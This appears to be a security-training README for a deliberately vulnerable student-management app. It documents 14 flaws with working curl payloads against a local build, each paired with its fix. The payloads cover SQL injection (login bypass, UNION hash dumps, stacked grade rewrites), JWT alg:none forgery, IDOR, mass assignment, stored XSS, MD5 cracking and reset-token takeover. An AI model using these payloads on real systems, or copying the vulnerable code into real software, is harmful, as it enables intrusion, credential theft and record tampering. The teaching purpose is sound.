# Vulnerabilities — exploitation and fixes

Each entry lists where the flaw lives, how to exploit it (with `curl`; the same
requests work in Burp Suite Repeater/Intruder), its impact, and the fix.

Run the vulnerable build first:

```bash
RESET_DB=1 python3 app.py            # http://127.0.0.1:3000   (vuln)
```

To confirm a fix, run the secure build and repeat the request:

```bash
RESET_DB=1 APP_MODE=secure PORT=3001 python3 app.py
```

Shortcut used below: `B=http://127.0.0.1:3000`

---

## 1. SQL injection — login bypass

**Where:** `app.py → h_login`.

```python
# VULN
sql = ("SELECT * FROM users WHERE username = '" + username +
       "' AND password_hash = '" + pwd_md5 + "'")
```

**Exploit** — log in as `admin` with no password. The `'--` comments out the
password check:

```bash
curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
  -d '{"username":"admin'\''-- ","password":"anything"}'
# -> 200 with a valid admin JWT
```

**Impact:** full authentication bypass as any user.

**Fix (secure build):**

```python
rows = db.run(conn, "SELECT * FROM users WHERE username = ?", (username,))
user = rows[0] if rows else None
if user and not auth.verify_password(password, user):
    user = None
```

Parameterized queries send SQL and data on separate channels, so input can never
change the statement. **Verify:** the payload now returns `401`.

---

## 2. SQL injection — certifications

**Where:** `app.py → h_certifications`. The `student_id` query parameter is
concatenated into a numeric context.

```python
# VULN
sql = ("... WHERE c.student_id = " + str(student_id))
```

**Exploit A** — read every student's certifications:

```bash
TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

curl -s "$B/api/certifications?student_id=0%20OR%201=1" -H "Authorization: Bearer $TOK"
```

**Exploit B** — UNION to dump every user's password hash (7 columns to match):

```bash
curl -s -G "$B/api/certifications" -H "Authorization: Bearer $TOK" \
  --data-urlencode "student_id=0 UNION SELECT id,role,username,password_hash,hash_scheme,NULL,full_name FROM users"
# hashes appear in the 'title'/'grade' fields
```

**Impact:** disclosure of all certifications and, via UNION, all credential hashes.

**Fix (secure build):** parameterize **and** authorize (a student may only read
their own):

```python
if ident.get("role") == "student" and str(student_id) != str(ident.get("sub")):
    return 403
rows = db.run(conn, "... WHERE c.student_id = ?", (student_id,))
```

**Verify:** the `OR 1=1` / UNION payloads return `403`; a student requesting
another student's id gets `403`.

---

## 3. Broken JWT authentication

**Where:** `auth.py → jwt_decode_vuln`. The signature is never checked and
`alg:none` is accepted.

```python
# VULN
if header.get("alg") == "none":
    return payload
return payload           # signature never verified
```

**Exploit** — forge a token with `role: admin`, no secret required:

```bash
FORGED=$(python3 - <<'PY'
import auth, json
h = auth.b64url_encode(json.dumps({"alg":"none","typ":"JWT"}).encode())
p = auth.b64url_encode(json.dumps({"sub":4,"username":"alice","role":"admin"}).encode())
print(f"{h}.{p}.")
PY
)
curl -s "$B/api/admin/users" -H "Authorization: Bearer $FORGED"     # -> full user list
```

In **Burp**, use the JWT Editor extension (or Decoder) to change the payload /
set `alg:none`, drop the signature, and replay.

**Impact:** any user can impersonate anyone and become admin.

**Fix (secure build):**

```python
if header.get("alg") != "HS256":                       # reject none / confusion
    return None
if not hmac.compare_digest(_sign(f"{h}.{p}".encode()), s):  # verify signature
    return None
if payload["exp"] < time.time():                       # enforce expiry
    return None
```

**Verify:** the forged token returns `401`; a token whose payload was edited also
fails (HMAC mismatch).

---

## 4. IDOR — read anyone's private conversation

**Where:** `app.py → h_chat` (`GET /api/chat?chat_users[0]=..&chat_users[1]=..`).
The conversation is chosen entirely by the two user ids in the URL, with no check
that the caller is one of them.

In the app, opening one of your chats produces a URL like
`…/#chat?chat_users[0]=4&chat_users[1]=5` — your id and the other person's. Editing
those two numbers loads **any** two users' private conversation.

**Exploit** — logged in as the student `alice` (id 4), read the private
`admin`(1) ↔ `prof_smith`(2) conversation, which contains a secret:

```bash
TOK=<alice token>   # from localStorage after login, or via curl /api/login
curl -s "$B/api/chat?chat_users[0]=1&chat_users[1]=2" -H "Authorization: Bearer $TOK"
# -> "... the grading portal master password is Adm1n_Gu@rd14n_2026 ..."
```

In the browser you don't even need a tool: sign in as `alice`, open **Chat**, click
a conversation, then change `chat_users[0]`/`chat_users[1]` in the address bar to
`1` and `2`. **Burp Intruder** over the two ids enumerates every conversation.

**Impact:** total confidentiality loss for private messages — including
professor/admin chats. Note the query is parameterized (this is an *authorization*
bug, not SQLi), and encryption at rest does **not** help: the server decrypts before
responding, so you still need access control.

**Fix (secure build):** you may only open a conversation you belong to (or admin):

```python
me = load_user(conn, ident.get("sub"))
if not (me["role"] == "admin" or ident.get("sub") in (u0, u1)):
    return 403
```

**Verify:** as `alice`, `chat_users[0]=1&chat_users[1]=2` returns `403`; your own
conversation (`4` & `5`) returns `200`.

---

## 5. Privilege escalation via registration

**Where:** `app.py → h_register`. The role is taken from the request body.

```python
role = b.get("role", "student")     # VULN: client picks its own role
```

**Exploit:**

```bash
curl -s -X POST $B/api/register -H 'Content-Type: application/json' \
  -d '{"username":"hacker","password":"x","role":"admin"}'      # -> role: admin
```

**Fix (secure build):** `role = "student"` — the server assigns roles.
**Verify:** the new account comes back as `student`.

---

## 6. Broken access control (missing function-level authorization)

Three endpoints perform privileged actions without checking the caller's role.

### 6a. Grades — a student can change their own grade

**Where:** `app.py → h_set_grade`.

```bash
# alice gives herself an A+ in course 1
curl -s -X POST $B/api/grades -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"course_id":1,"student_id":4,"grade":"A+"}'
```

**Fix:** require admin, or the professor who owns that course.

### 6b. Certifications — a student can issue themselves a fake diploma

**Where:** `app.py → h_issue_cert`.

```bash
curl -s -X POST $B/api/certifications -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' \
  -d '{"student_id":4,"title":"PhD in Computer Science","grade":"A+","issued_date":"2026-09-30"}'
```

**Fix:** admins only (and the cert is signed — see #8).

### 6c. Admin user list trusts the token's role claim

**Where:** `app.py → h_admin_users`. Combined with #3 this exposes every user
(including password hashes). **Fix:** re-check the role from the database and never
return hashes.

**Verify (all three):** in the secure build each returns `403` for a student; a
real admin/professor still succeeds where appropriate.

---

## 7. Insecure password hashing

**Where:** `auth.py → hash_password`. Passwords are stored as **unsalted MD5**.

**Exploit:** the hashes leaked in #2/#6c crack instantly. Every seeded password is
a fast MD5:

```bash
python3 -c 'import hashlib;print(hashlib.md5(b"admin123").hexdigest())'
# 0192023a7bbd73250516f069df18b500  -> matches the dumped hash
python3 -c 'import hashlib;print(hashlib.md5(b"qwerty").hexdigest())'
# d8578edf8458ce06fbc5bb76a58c5ca4  -> carol
```

Unsalted also means equal passwords produce equal hashes.

**Fix (secure build):** PBKDF2-HMAC-SHA256, per-user random salt, 200k iterations,
constant-time comparison. **Verify:** `sqlite3 sms_secure.db "SELECT hash_scheme,salt
FROM users"` shows `pbkdf2` with a salt; the hashes no longer reverse.

> In production prefer `bcrypt`/`scrypt`/`argon2`; PBKDF2 is used here because a
> KDF is enough to make the point and it needs no extra service.

---

## 8. Cryptography — encryption at rest and certificate signatures

Two protections are **absent** in the vuln build and **present** in the secure one.

### 8a. Digital signatures on certifications (Ed25519)

Vuln build stores certificates **unsigned** and never verifies them, so a forged
certificate (see #6b) is indistinguishable from a real one — the API reports every
cert as `verified: true`.

Secure build signs each certificate with the issuer's Ed25519 key
(`crypto_utils.sign_cert`) and verifies it on read (`verify_cert`). Any change to
`student_id`, `title`, `grade` or `issued_date` breaks the signature:

```bash
# secure build: tamper a grade directly in the DB, keep the old signature
sqlite3 sms_secure.db "UPDATE certifications SET grade='A+' WHERE title='Python Developer';"
# the API now reports that certificate as  verified: false
```

The public key is served at `GET /api/pubkey` so a third party can verify
independently. This is the **HMAC / digital-signature** requirement — HMAC-SHA256
also protects the JWT (see #3).

### 8b. Encryption at rest for messages (AES-256-GCM)

Vuln build stores message bodies in plaintext — anyone with the DB file reads
everything:

```bash
sqlite3 sms_vuln.db "SELECT subject, body FROM messages LIMIT 3;"   # readable
```

Secure build encrypts bodies with AES-256-GCM (`crypto_utils.encrypt`) before
storing them:

```bash
sqlite3 sms_secure.db "SELECT subject, body FROM messages LIMIT 3;"  # ciphertext
```

**Defense-in-depth note:** encryption at rest protects the *database file*; it does
**not** fix the IDOR in #4, because the server decrypts before responding. You need
both access control *and* encryption.

---

## 9. No integrity anchoring — grade/certificate tampering goes undetected

**Where:** `app.py → h_set_grade`, `h_issue_cert`, `h_certifications`,
`h_grade_integrity`; ledger in `eth_ledger.py` + `contracts/src/GradeLedger.sol`.

The vuln build keeps academic records in the `grades` and `certifications` tables
only. If an attacker reaches the database — via the SQL injection in #2, a stolen
file, or direct access — they can change a grade or insert a diploma and nothing
flags it: the application never cross-checks the records against an independent,
tamper-evident source.

**Exploit** — in the vuln build, change a grade straight in the DB; the app shows it
without question and offers no way to tell it was altered:

```bash
sqlite3 sms_vuln.db "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
# /api/my/grades now shows 20.00; the build has no ledger and no integrity check
# (/api/grades/integrity and /api/blockchain return 404)
```

**Impact:** silent, unattributable tampering with grades and certificates — the
records an institution exists to vouch for.

**Fix (secure build):** anchor a hash of every record in a smart contract that only
the issuer can write, and verify on read.

- *On write*, `h_set_grade` / `h_issue_cert` compute the SHA-256 of the row as
  stored and call `anchorGrade` / `anchorCertificate` on `GradeLedger`. The DB
  change is committed only if the transaction succeeded; if anvil is down it is
  rolled back and the API returns `503`.
- *On read*, the hash is recomputed from the DB and compared with the contract:

  ```bash
  sqlite3 sms_secure.db "UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1;"
  # GET /api/grades/integrity -> Mathematics: db_hash != chain_hash -> ok:false (TAMPERED)
  ```

  A certificate inserted straight into the DB comes back `verified:false` **and**
  `on_chain:false`; a genuine one is `on_chain:true`.
- *The ledger itself cannot be fixed up* by the attacker: it lives in a separate
  process (not in the SQLite file), and the contract's `onlyIssuer` modifier
  rejects every write not signed by `keys/eth_issuer.key`:

  ```solidity
  modifier onlyIssuer() {
      if (msg.sender != issuer) revert NotIssuer();
      _;
  }
  ```

  A write from any other account reverts with `NotIssuer()` (see DEMO §8).

**Verify:** `python3 scripts/try_attack.py` runs the same attacks against both
builds and prints the result side by side. By hand: the vuln build has no
integrity endpoint (404) and certificates carry no `on_chain` field; on the secure
build grades show `ok:true` until the DB is edited, and `cd contracts && forge test`
shows a non-issuer write reverting.

**Limits:** one local node is not decentralized, and whoever steals the issuer key
(i.e. compromises the app server) can anchor false records. The fix protects
against attackers who can write to the *database*, which is the threat here.

---

## 10. SQL injection — people directory (stacked write)

**Where:** `app.py → h_search` (`GET /api/search?query=`). The search term is
concatenated into a `LIKE` pattern and run with `db.run_raw_multi`, which also
executes **stacked** statements (`;`-separated):

```python
# VULN
sql = ("SELECT id, full_name, role FROM users "
       "WHERE full_name LIKE '%" + query + "%' ORDER BY full_name")
rows = db.run_raw_multi(conn, sql)   # runs every statement in the string
```

Unlike #1 and #2 (read-only injections), this one gives an attacker a **write
primitive** — and it needs no admin login and no access to the Gradebook page.
Any logged-in user (a student) can change any grade straight from the search box.

**Exploit A** — UNION read, leak password hashes (3 columns to match):

```bash
TOK=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
      -d '{"username":"alice","password":"password1"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')

curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
  --data-urlencode "query=' UNION SELECT id, password_hash, role FROM users -- "
# every user's MD5 hash appears in the full_name column
```

**Exploit B** — stacked `UPDATE`, change Alice's Mathematics grade (course 1):

```bash
curl -s -G "$B/api/search" -H "Authorization: Bearer $TOK" \
  --data-urlencode "query=%'; UPDATE grades SET grade='20.00' WHERE student_id=4 AND course_id=1; -- "
# results come back empty, but /api/my/grades now shows 20.00 — a student just
# rewrote their own grade through a search box.
```

In the browser: log in as `alice` / `password1`, open **Directory**, and paste
the Exploit B string into the search field. The search shows no matches, but the
Math grade on the Dashboard is now 20/20. The vuln build has no ledger, so (as in
#9) nothing detects it.

**Fix (secure build):** bind the term as a parameter — it is then only ever data,
never SQL — and the query stays a single statement, so stacking is impossible:

```python
rows = db.run(conn,
    "SELECT id, full_name, role FROM users WHERE full_name LIKE ? ORDER BY full_name",
    ("%" + query + "%",))
```

**Verify:** on the secure build the same Exploit B payload returns no results and
leaves the grade at 14.00; `/api/grades/integrity` still shows `ok:true`. (Even if
an attacker reached the database directly, the #9 ledger would flag the change.)

---

## 11. Stored XSS — announcements feed

**Where:** `app.py → h_post_announcement` (storage) and `static/app.js → announceBody`
(output). Staff post to a shared news feed; the body is stored verbatim and rendered
for every reader on the Announcements page and the dashboard widget.

```js
// VULN: the body is injected as raw HTML
function announceBody(body) { return MODE === "secure" ? esc(body) : (body || ""); }
```

**Exploit** — as a professor (or a student who escalated via #5/#13), post an
announcement whose body is a script. It runs in every reader's browser, including
the admin's:

```bash
PT=$(curl -s -X POST $B/api/login -H 'Content-Type: application/json' \
     -d '{"username":"prof_jones","password":"teach456"}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["token"])')
curl -s -X POST $B/api/announcements -H "Authorization: Bearer $PT" \
  -H 'Content-Type: application/json' \
  -d '{"title":"Timetable","body":"<img src=x onerror=\"document.title=document.cookie\">"}'
# open the Announcements page in the vuln build -> the payload fires
```

**Impact:** session/token theft, actions performed as any viewer (stored, so it hits
everyone who loads the feed). **Fix (secure build):** HTML-escape on output
(`esc`) — the payload renders as inert text. **Verify:** the same announcement
shows as literal text in the secure build and never executes.

---

## 12. IDOR — read any student's document

**Where:** `app.py → h_get_document` (`GET /api/documents/<id>`). A student requests
official documents (attestation, transcript); an approved one is viewable by id, with
no check that the caller owns it.

**Exploit** — as `alice`, read another student's document by walking the id (ids
appear in your own request list):

```bash
curl -s $B/api/documents/1 -H "Authorization: Bearer $TOK"   # not alice's -> leaked
```

**Impact:** disclosure of other students' documents (name, e-mail, reference).
**Fix (secure build):** a student may read only their own document; staff/admin any.

```python
if me["role"] == "student" and doc["student_id"] != me["id"]:
    return 403
```

**Verify:** in the secure build the foreign id returns `403`; your own returns `200`.

---

## 13. Mass assignment — profile update sets privileged columns

**Where:** `app.py → h_update_profile` (`POST /api/profile`). The vuln build writes
every key in the body to the user row; the form only exposes name/email/phone/address.

```python
# VULN
fields = [k for k in b if k in cols and k != "id"]      # includes role, password_hash…
conn.execute("UPDATE users SET " + ", ".join(f"{k} = ?" for k in fields) + " WHERE id = ?", …)
```

**Exploit** — as the student `alice`, add `role` (or `password_hash`) to the request:

```bash
curl -s -X POST $B/api/profile -H "Authorization: Bearer $TOK" \
  -H 'Content-Type: application/json' -d '{"full_name":"Alice","role":"admin"}'
curl -s $B/api/me -H "Authorization: Bearer $TOK"        # -> role: admin
```

**Impact:** privilege escalation to admin from an ordinary account. **Fix (secure
build):** write only an explicit whitelist (`full_name, email, phone, address`);
`role`, `id`, `password_hash`, `username` are never taken from the request.
**Verify:** the same request leaves `role` as `student`.

---

## 14. Predictable password-reset token

**Where:** `app.py → _reset_token` / `h_reset_request` / `h_reset_confirm`.

```python
# VULN: token is a function of the (public) username, no randomness, no expiry
return hashlib.md5(("reset:" + username).encode()).hexdigest()[:12]
```

**Exploit** — take over any account knowing only its username (public in the
directory). Trigger a reset, then compute the same token offline and set a new
password:

```bash
curl -s -X POST $B/api/password-reset/request -H 'Content-Type: application/json' -d '{"username":"carol"}'
TOK=$(python3 -c "import hashlib;print(hashlib.md5(b'reset:carol').hexdigest()[:12])")
curl -s -X POST $B/api/password-reset/confirm  -H 'Content-Type: application/json' \
  -d "{\"token\":\"$TOK\",\"new_password\":\"pwned123\"}"    # -> carol's password is now pwned123
```

(The vuln build also returns the token in the response.) **Impact:** account
takeover of anyone. **Fix (secure build):** a cryptographically random
`secrets.token_urlsafe` token, stored hashed, single-use, expiring in 15 minutes,
never returned in the response and with a response that doesn't reveal whether the
account exists. **Verify:** the guessed MD5 token returns `400` on the secure build;
only the random token from the server log works, once.

---

## Surfaced realistically (not new flaws)

Three existing flaws were moved off-screen so they're found the way they would be in
a real engagement, without changing whether they exist:

- **#2/#6c credential leak** — the vuln `GET /api/admin/users` still returns
  `password_hash`, but the Users page no longer renders it; you find it in the
  Network tab / Burp, not in a visible column.
- **IDOR recon (#4, #12)** — internal ids are no longer printed in the UI (directory,
  dashboards, dropdowns, profile). They still appear in JSON and in the chat URL,
  which is the normal recon path.
- **#5 role escalation** — the disabled "Account type" field was removed from the
  signup form; the client simply never sends a role, and the attacker discovers the
  vuln build accepts one by adding it to the request.

---

## Summary

| # | Vulnerability | Fix |
|---|---------------|-----|
| 1 | SQLi login bypass | parameterized query |
| 2 | SQLi in certifications | parameterized query + authorization |
| 3 | JWT not verified / `alg:none` | pin alg, verify HMAC, check exp |
| 4 | IDOR on chat conversations | ownership/role check |
| 5 | Privilege escalation at registration | server-assigned role |
| 6 | Broken access control (grades/certs/admin) | server-side role checks |
| 7 | Unsalted MD5 passwords | PBKDF2 + salt |
| 8 | No signatures / no encryption at rest | Ed25519 signatures + AES-GCM |
| 9 | No integrity anchoring (tampering undetected) | issuer-only smart contract: anchor hashes on write, verify on read |
| 10 | SQLi in people search (stacked write → grade change) | parameterized query, single statement |
| 11 | Stored XSS in announcements | HTML-escape on output |
| 12 | IDOR on documents | ownership/role check |
| 13 | Mass assignment on profile update | server-side field whitelist |
| 14 | Predictable password-reset token | random, hashed, single-use, expiring token |

**Secure-build business rules** (flaws only in the vuln build, not numbered attacks):
grades must be numeric and within 0–20; certificates enforce a minimum grade
(Achievement ≥ 10, Honors ≥ 16); the session returns to login on token expiry.
